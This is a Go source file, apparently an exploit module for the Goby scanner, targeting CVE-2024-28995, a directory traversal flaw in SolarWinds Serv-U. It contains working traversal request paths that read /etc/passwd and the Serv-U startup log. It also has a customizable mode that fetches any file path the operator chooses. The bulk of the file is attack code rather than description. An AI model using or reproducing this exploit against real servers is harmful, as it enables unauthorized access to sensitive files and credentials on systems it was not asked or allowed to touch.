package exploits

import (
	"log"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Solarwinds Ser-U /?InternalDir Directory Traversal Vulnetability",
    "Description": "<p>SolarWinds Serv-U is a file transfer server software developed by SolarWinds, which is mainly used to manage file transfer safely and efficiently.</p><p>SolarWinds Serv-U has a directory traversal vulnerability through which attackers can obtain sensitive information.</p>",
    "Product": "Serv-U-FTP",
    "Homepage": "http://www.serv-u.com",
    "DisclosureDate": "2024-06-14",
    "PostTime": "2024-06-14",
    "Author": "Town",
    "FofaQuery": "body=\"UserPlacementPost\" && body=\"/Common/Images/Warn.png\"",
    "GobyQuery": "body=\"UserPlacementPost\" && body=\"/Common/Images/Warn.png\"",
    "Level": "1",
    "Impact": "<p>SolarWinds Serv-U has a directory traversal vulnerability through which attackers can obtain sensitive information.</p>",
    "Recommendation": "<p>The manufacturer has released a bug fix, please pay attention to the update in time: <a href=\"http://www.serv-u.com\">http://www.serv-u.com</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Serv-U-StartupLog.txt,Linux_passwd,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "VulType": [
        "Directory Traversal"
    ],
    "CVEIDs": [
        "CVE-2024-28995"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Solarwinds Ser-U /?InternalDir 目录遍历漏洞",
            "Product": "SolarWinds-Serv-U-FTP",
            "Description": "<p>SolarWinds Serv-U 是一款由 SolarWinds 公司开发的文件传输服务器软件，主要用于安全和高效地管理文件传输。<br></p><p>SolarWinds Serv-U 存在目录遍历漏洞，攻击者可以通过这个漏洞获取敏感信息。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.serv-u.com\">http://www.serv-u.com</a><br></p>",
            "Impact": "<p>SolarWinds Serv-U 存在目录遍历漏洞，攻击者可以通过这个漏洞获取敏感信息。<br></p>",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "Solarwinds Ser-U /?InternalDir Directory Traversal Vulnetability",
            "Product": "Serv-U-FTP",
            "Description": "<p>SolarWinds Serv-U is a file transfer server software developed by SolarWinds, which is mainly used to manage file transfer safely and efficiently.</p><p>SolarWinds Serv-U has a directory traversal vulnerability through which attackers can obtain sensitive information.</p>",
            "Recommendation": "<p>The manufacturer has released a bug fix, please pay attention to the update in time: <a href=\"http://www.serv-u.com\" rel=\"nofollow\">http://www.serv-u.com</a><br></p>",
            "Impact": "<p>SolarWinds Serv-U has a directory traversal vulnerability through which attackers can obtain sensitive information.<br></p>",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10961"
}`

	/*
	  "ExpParams": [
	    {
	      "name": "mode",
	      "type": "select",
	      "value": "默认读取的文件,Customize",
	      "show": ""
	    },
	    {
	      "name": "Customize",
	      "type": "input",
	      "value": "",
	      "show": "mode=Customize"
	    }
	  ],
	*/

	postOrGet_AAAAA := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		payloadConfig := httpclient.NewGetRequestConfig(fileUrl)
		payloadConfig.VerifyTls = false
		payloadConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, payloadConfig)
		if err != nil {
			return "", nil
		}
		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.Utf8Html, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := ""
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/?InternalDir=/../../../../ProgramData/RhinoSoft/Serv-U/&InternalFile=Serv-U-StartupLog.txt": "SolarWinds Worldwide, LLC.  All rights reserved.",
				"/?InternalDir=\\..\\..\\..\\..\\etc&InternalFile=passwd":                                     "root:x",
			}
			// 函数继承
			uploadFileFunc := postOrGet_AAAAA

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])
			log.Println(mode)

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"Serv-U-StartupLog.txt": {"/?InternalDir=/../../../../ProgramData/RhinoSoft/Serv-U/&InternalFile=Serv-U-StartupLog.txt", "SolarWinds Worldwide, LLC.  All rights reserved."},
				"Linux_passwd":          {"/?InternalDir=\\..\\..\\..\\..\\etc&InternalFile=passwd", "root:x"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_AAAAA

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
